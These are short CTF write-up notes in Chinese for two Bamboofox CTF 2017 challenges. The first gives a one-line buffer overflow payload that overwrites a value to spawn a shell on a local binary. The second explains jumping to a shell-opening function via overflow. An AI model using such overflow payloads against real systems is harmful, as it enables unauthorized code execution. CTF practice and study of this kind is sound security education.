# Bamboofox CTF 2017 - Notes

## water-impossible

透過 overflow 蓋值來 get shell ， payload:
```
$ (python -c 'from pwn import * ; print "a"*28 + p32(0x1a0a)';cat -) | ./vul
```

## infant-gotoheaven

有一個函數 main.weird 會開 shell，所以只要 overflow 跳過去就好

(不會反編譯 golang QQ)